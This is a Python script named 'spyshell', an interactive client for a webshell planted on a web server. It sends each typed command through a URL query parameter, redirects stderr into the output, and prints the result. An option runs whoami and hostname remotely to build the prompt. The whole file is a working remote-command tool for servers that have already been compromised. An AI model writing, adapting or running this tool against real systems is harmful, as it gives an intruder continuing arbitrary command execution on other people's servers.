#!/usr/bin/env python3

# spyshell - A simple webshell front-end written in Python

import argparse
import requests
import readline
import sys
import os

# GNU readline
# ------------
rl_hist_filename = os.path.expanduser("~/.spyshell_history")
rl_hist_len = 0


def rl_save_history():
    readline.set_history_length(1000)
    readline.append_history_file(
        readline.get_current_history_length() - rl_hist_len, rl_hist_filename
    )


# Functions
# ---------


def do_shell_command(url, cmd):
    resp = requests.get("".join([url, cmd]))
    return resp.text


def exit(err=0):
    rl_save_history()
    sys.exit(err)


# Init Argument Parser
# --------------------
arg_parser = argparse.ArgumentParser()
arg_parser.add_argument("--url", "-u", type=str, required=True, help="URL of webshell")
arg_parser.add_argument(
    "--command-param",
    "-c",
    type=str,
    default="cmd",
    help="Name of 'command' query parameter (default: cmd)",
)
arg_parser.add_argument(
    "--pretty-prompt", "-p", action="store_true", help="Use a nicer shell prompt"
)

# Entry Point
# -----------
def main():
    args = arg_parser.parse_args()

    try:
        readline.read_history_file(rl_hist_filename)
        rl_hist_len = readline.get_current_history_length()
    except FileNotFoundError:
        open(rl_hist_filename, "wb").close()
        rl_hist_len = 0

    baseurl = "".join([args.url, "?", args.command_param, "=2>%261 "])

    prompt = "$ "
    if args.pretty_prompt:
        username = do_shell_command(baseurl, "whoami").strip()
        hostname = do_shell_command(baseurl, "hostname").strip()
        prompt = "".join([f"{username}@{hostname}", prompt])

    while True:
        try:
            cmd = requests.utils.quote(input(prompt))
            if cmd == "exit":
                exit()
            out = do_shell_command(baseurl, cmd).strip()
            print(out)
        except (KeyboardInterrupt, EOFError):
            exit()


if __name__ == "__main__":
    main()
